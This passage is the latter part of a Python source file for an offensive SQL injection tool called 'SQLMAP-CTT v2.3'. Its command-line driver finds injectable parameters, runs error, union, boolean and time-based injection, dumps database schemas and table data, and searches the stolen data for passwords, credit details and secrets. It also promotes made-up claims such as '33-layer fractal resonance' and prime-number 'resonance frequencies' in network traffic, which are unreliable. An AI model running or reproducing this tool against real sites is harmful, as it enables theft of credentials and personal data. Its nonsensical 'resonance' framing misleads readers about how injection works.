            search_terms = ['admin', 'password', 'user', 'email', 'credit', 'secret']
        
        print(f"\n[+] Searching for sensitive data: {search_terms}")
        print("=" * 60)
        
        all_results = {}
        for term in search_terms:
            print(f"[+] Searching for: {term}")
            results = self.extractor.search_for_data(term)
            if results:
                all_results[term] = results
                for table, data in results.items():
                    print(f"  Found in {table}: {len(data)} rows")
        
        if all_results:
            # Save search results
            timestamp = int(time.time())
            os.makedirs("sensitive_data", exist_ok=True)
            with open(f"sensitive_data/search_results_{timestamp}.json", 'w') as f:
                json.dump(all_results, f, indent=2)
            print(f"\n[+] Sensitive data saved to: sensitive_data/search_results_{timestamp}.json")
        
        return all_results
    
    def generate_report(self) -> Dict[str, Any]:
        """Generate comprehensive CTT report"""
        total_time = time.time() - self.stats['start_time']
        
        # Calculate effectiveness
        effectiveness = 0.0
        if self.stats['injections'] > 0:
            effectiveness = self.stats['successful'] / self.stats['injections']
        
        # Find best layer
        best_layer = -1
        best_performance = 0.0
        for layer, perf in self.layer_performance.items():
            if perf > best_performance:
                best_performance = perf
                best_layer = layer
        
        # Perform extraction if requested
        extraction_results = {}
        if self.extract_depth > 0 and self.stats['successful'] > 0:
            try:
                extraction_results = self.perform_extraction()
            except Exception as e:
                print(f"[!] Extraction failed: {e}")
                extraction_results = {'error': str(e)}
        
        report = {
            'target': self.target_url,
            'timestamp': time.time(),
            'total_time': total_time,
            'statistics': self.stats,
            'effectiveness': effectiveness,
            'best_layer': best_layer,
            'best_layer_performance': best_performance,
            'successful_payloads_count': len(self.successful_payloads),
            'temporal_signatures_count': len(self.temporal_signatures),
            'ctt_parameters': {
                'alpha': self.fractal_engine.alpha,
                'resonance_freq': self.fractal_engine.resonance_freq,
                'primes_used': list(self.fractal_engine.primes),
                'layers': self.fractal_engine.layers
            },
            'extraction_results': extraction_results,
            'recommendations': self._get_recommendations()
        }
        
        # Convert sets to lists for JSON serialization
        report['statistics']['layers_used'] = list(report['statistics']['layers_used'])
        report['statistics']['primes_used'] = list(report['statistics']['primes_used'])
        
        return report
    
    def _get_recommendations(self) -> List[str]:
        """Get CTT-enhanced attack recommendations"""
        recommendations = []
        
        if self.stats['successful'] > 0:
            recommendations.append("✅ CTT vulnerabilities detected - proceed with fractal data extraction")
            
            # Check what type of vulnerabilities
            vuln_types = set()
            for sig in self.temporal_signatures.values():
                for signal in sig.get('signals', []):
                    vuln_types.add(signal[0])
            
            if 'time_delay' in vuln_types:
                recommendations.append("⏱️  Time-based SQLi detected - use SLEEP() with CTT resonance")
            if 'sql_error' in vuln_types:
                recommendations.append("🚨 Error-based SQLi detected - use verbose error extraction with α-dispersion")
            if 'union' in vuln_types:
                recommendations.append("🔗 UNION-based SQLi detected - direct data extraction possible")
            if 'db_output' in vuln_types:
                recommendations.append("💾 Database output detected - can extract data directly")
            if 'prime_resonance' in vuln_types:
                recommendations.append("⚡ Prime resonance detected - optimize for prime layers")
            if 'resonance_pattern' in vuln_types:
                recommendations.append("🎵 Resonance patterns detected - frequency tuning successful")
            
            # Layer recommendation
            best_layer = max(self.layer_performance.items(), key=lambda x: x[1])[0]
            recommendations.append(f"🎯 Most effective CTT layer: {best_layer}")
            
            if best_layer in self.fractal_engine.primes:
                recommendations.append("⚡ Prime layer shows strong resonance - prioritize for advanced attacks")
            
            # Extraction recommendations based on depth
            if self.extract_depth == 0:
                recommendations.append("📊 Use --extract-depth=1 for basic database fingerprinting")
                recommendations.append("📊 Use --extract-depth=2 for schema enumeration")
                recommendations.append("📊 Use --extract-depth=3 for full data extraction")
        else:
            recommendations.append("❌ No CTT vulnerabilities detected with current parameters")
            recommendations.append("💡 Try adjusting α, resonance frequency, or prime selection")
        
        # CTT-specific recommendations
        recommendations.append(f"🔧 CTT Alpha (α): {self.fractal_engine.alpha}")
        recommendations.append(f"🎵 Resonance Frequency: {self.fractal_engine.resonance_freq} Hz")
        recommendations.append(f"🔢 Primes used: {len(self.fractal_engine.primes)}")
        recommendations.append(f"📤 Request Method: {self.stats['method']}")
        recommendations.append(f"🎯 Technique: {self.technique}")
        recommendations.append(f"📊 Extraction Depth: {self.extract_depth}")
        recommendations.append("🔒 Test only on authorized systems with proper consent")
        
        return recommendations

# ============================================================================
# MAIN INTERFACE WITH ROBUST EXTRACTION
# ============================================================================
def main():
    parser = argparse.ArgumentParser(
        description='SQLMAP-CTT v2.3: 33-Layer Fractal Resonance SQL Injection with Robust Extraction',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s -u "http://test.com/page?id=1"
  %(prog)s -u "http://test.com/search" --data "q=test&submit=go" --ctt-alpha=0.0302011
  %(prog)s -u "http://test.com/" --data "searchFor=test&goButton=go" --resonance-freq=587000
  %(prog)s -u "http://test.com/" --temporal-threads=11 --timeout=20 --data "param=value"
  %(prog)s -u "http://test.com/" --technique=E --extract-depth=3
  %(prog)s -u "http://test.com/" --extract-depth=2 --output=full_report.json

Extraction Depths:
  0: Detection only (default)
  1: Database fingerprinting (type, version, user)
  2: Schema enumeration (databases, tables, columns)
  3: Full data extraction (dump table data)

Techniques:
  auto: All techniques (default)
  E: Error-based SQL injection
  U: Union-based SQL injection
  B: Boolean-based blind SQL injection
  T: Time-based blind SQL injection
        '''
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('--data', type=str, default='', 
                       help='POST data (e.g., "param1=value1&param2=value2")')
    parser.add_argument('--ctt-alpha', type=float, default=0.0302011, 
                       help='CTT temporal dispersion coefficient (default: 0.0302011)')
    parser.add_argument('--ctt-primes', type=str, default='',
                       help='Custom prime numbers for resonance (comma-separated)')
    parser.add_argument('--resonance-freq', type=float, default=587000,
                       help='Resonance frequency in Hz (default: 587000)')
    parser.add_argument('--temporal-threads', type=int, default=11,
                       help='Number of temporal threads (default: 11)')
    parser.add_argument('--timeout', type=int, default=15,
                       help='Request timeout in seconds (default: 15)')
    parser.add_argument('--technique', type=str, default='auto',
                       choices=['auto', 'E', 'U', 'B', 'T', 'error', 'union', 'boolean', 'time'],
                       help='SQL injection technique to use (default: auto)')
    parser.add_argument('--extract-depth', type=int, default=0,
                       choices=[0, 1, 2, 3],
                       help='Data extraction depth (0-3, default: 0)')
    parser.add_argument('--search-sensitive', action='store_true',
                       help='Search for sensitive data (admin, password, etc.)')
    parser.add_argument('--output', type=str, default='',
                       help='Output file for report (default: auto-generated)')
    
    args = parser.parse_args()
    
    # Parse custom primes
    custom_primes = []
    if args.ctt_primes:
        try:
            custom_primes = [int(p.strip()) for p in args.ctt_primes.split(',')]
            print(f"[+] Using custom primes: {custom_primes[:5]}...")
        except ValueError:
            print(f"[!] Invalid primes format. Using default primes.")
            custom_primes = None
    
    print(r"""
     _____ _____ __  __    _    ____ _____ 
    / ____/ ____|  \/  |  / \  / ___|_   _|
   | (___| (___ | \  / | / _ \| |     | |  
    \___ \\___ \| |\/| |/ ___ \ |___  | |  
     ____) |___) | |  | /_/   \_\____| |_  
    |_____/_____/|_|  |_|      CTT v2.3
    
    33-Layer Fractal SQL Injection Engine
    with ROBUST Data Extraction
    Author: Americo Simoes (amexsimoes@gmail.com)
    Copyright © 2026 Americo Simoes
    """)
    
    print(f"[+] Target URL: {args.url}")
    print(f"[+] CTT Configuration:")
    print(f"    • Alpha (α): {args.ctt_alpha}")
    print(f"    • Resonance Frequency: {args.resonance_freq} Hz")
    print(f"    • Temporal Threads: {args.temporal_threads}")
    print(f"    • Technique: {args.technique}")
    print(f"    • Extraction Depth: {args.extract_depth}")
    print(f"    • Search Sensitive: {'Yes' if args.search_sensitive else 'No'}")
    print(f"    • Custom Primes: {'Yes' if custom_primes else 'No'}")
    print(f"    • Timeout: {args.timeout}s")
    if args.data:
        print(f"    • POST Data: {args.data[:50]}...")
    else:
        print(f"    • Method: GET (auto-detect)")
    print("-" * 60)
    
    try:
        # Initialize CTT engine with custom parameters
        engine = CTT_SQLInjectionEngine(
            target_url=args.url,
            timeout=args.timeout,
            alpha=args.ctt_alpha,
            custom_primes=custom_primes,
            resonance_freq=args.resonance_freq,
            temporal_threads=args.temporal_threads,
            post_data=args.data if args.data else None,
            technique=args.technique,
            extract_depth=args.extract_depth
        )
        
        # Discover injection points
        print("[+] Discovering injection points...")
        injection_points = engine.discover_injection_points()
        
        if not injection_points:
            print("[!] No injection points found.")
            print("[!] Try specifying parameters in URL or with --data")
            print("[!] Examples:")
            print("    http://site.com/page?param=value")
            print("    --data \"param1=value1&param2=value2\"")
            sys.exit(1)
        
        print(f"[+] Found {len(injection_points)} potential injection points")
        
        # Test each injection point
        all_results = []
        for i, point in enumerate(injection_points):
            print(f"\n[{i+1}/{len(injection_points)}] Testing: {point['parameter']} ({point['type']})")
            print(f"    Context: {point['context']}")
            print(f"    Original value: {point['value'][:30]}..." if len(point['value']) > 30 else f"    Original value: {point['value']}")
            
            results = engine.test_injection_point(
                point['parameter'], 
                point['value'], 
                point['type']
            )
            
            # Summarize results for this parameter
            vulnerable = any(r['vulnerable'] for r in results)
            if vulnerable:
                vuln_count = sum(1 for r in results if r['vulnerable'])
                best_conf = max(r['confidence'] for r in results if r['vulnerable'])
                print(f"    ✅ CTT VULNERABILITY DETECTED! ({vuln_count} payloads, max confidence: {best_conf:.2f})")
            else:
                print(f"    ❌ No vulnerability detected")
            
            all_results.extend(results)
        
        # Search for sensitive data if requested
        sensitive_results = {}
        if args.search_sensitive and engine.stats['successful'] > 0:
            sensitive_results = engine.search_for_sensitive_data()
        
        # Generate final report
        print("\n" + "=" * 60)
        print("CTT SQL INJECTION REPORT")
        print("=" * 60)
        
        report = engine.generate_report()
        
        print(f"Target: {report['target']}")
        print(f"Time elapsed: {report['total_time']:.1f}s")
        print(f"Requests made: {report['statistics']['requests']}")
        print(f"Injection attempts: {report['statistics']['injections']}")
        print(f"Successful CTT detections: {report['statistics']['successful']}")
        print(f"Effectiveness: {report['effectiveness']:.1%}")
        print(f"Technique used: {report['statistics']['technique']}")
        print(f"Extraction depth: {report['statistics']['extract_depth']}")
        
        # Show extraction results if any
        if report['extraction_results']:
            print(f"\n[+] Extraction Results:")
            if 'database_info' in report['extraction_results']:
                db_info = report['extraction_results']['database_info']
                print(f"  Database: {db_info.get('type', 'Unknown')} {db_info.get('version', 'Unknown')}")
            
            if 'current_user' in report['extraction_results']:
                print(f"  Current User: {report['extraction_results']['current_user']}")
            
            if 'current_database' in report['extraction_results']:
                print(f"  Current Database: {report['extraction_results']['current_database']}")
            
            if 'tables' in report['extraction_results']:
                tables = report['extraction_results']['tables']
                print(f"  Tables found: {len(tables)}")
                for table in tables[:5]:
                    print(f"    - {table}")
            
            if 'output_dir' in report['extraction_results']:
                print(f"  Data saved to: {report['extraction_results']['output_dir']}/")
        
        # Show sensitive data results if any
        if sensitive_results:
            print(f"\n[+] Sensitive Data Found:")
            for term, results in sensitive_results.items():
                if results:
                    print(f"  '{term}': {sum(len(data) for data in results.values())} rows across {len(results)} tables")
        
        print(f"\nRecommendations:")
        for rec in report['recommendations']:
            print(f"  {rec}")
        
        # Save report
        if args.output:
            report_file = args.output
        else:
            timestamp = int(time.time())
            report_file = f"ctt_sqli_report_{timestamp}.json"
        
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        
        print(f"\n[+] Detailed CTT report saved to: {report_file}")
        
        # Show successful payloads if any
        if engine.successful_payloads:
            print(f"\n[+] Successful CTT Payloads ({len(engine.successful_payloads)}):")
            for i, (key, payload) in enumerate(list(engine.successful_payloads.items())[:3]):
                print(f"  {i+1}. Layer {payload['layer']}: {payload['payload'][:60]}...")
                print(f"     Confidence: {payload['confidence']:.2f}, Time: {payload['response_time']:.2f}s")
        
        # Final CTT notes
        print("\n" + "=" * 60)
        print("CTT TECHNOLOGY NOTES:")
        print("=" * 60)
        print("1. CTT uses 33-layer fractal resonance for enhanced detection")
        print("2. Alpha (α) controls temporal dispersion in payloads")
        print("3. Prime numbers create resonance patterns in network traffic")
        print("4. Resonance frequency tunes detection to specific patterns")
        print("5. Robust extraction engine with comprehensive error handling")
        print("=" * 60)
        print("⚠️  AUTHORIZED USE ONLY - RESPONSIBLE DISCLOSURE REQUIRED")
        print("© 2026 Americo Simoes - amexsimoes@gmail.com")
        print("=" * 60)
        
    except KeyboardInterrupt:
        print("\n[!] CTT scan interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[!] CTT fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    # Check for required packages
    try:
        import numpy
        import scipy
    except ImportError as e:
        print(f"[!] Missing required package: {e}")
        print("[!] Install with: pip install numpy scipy requests")
        sys.exit(1)
    
    main()
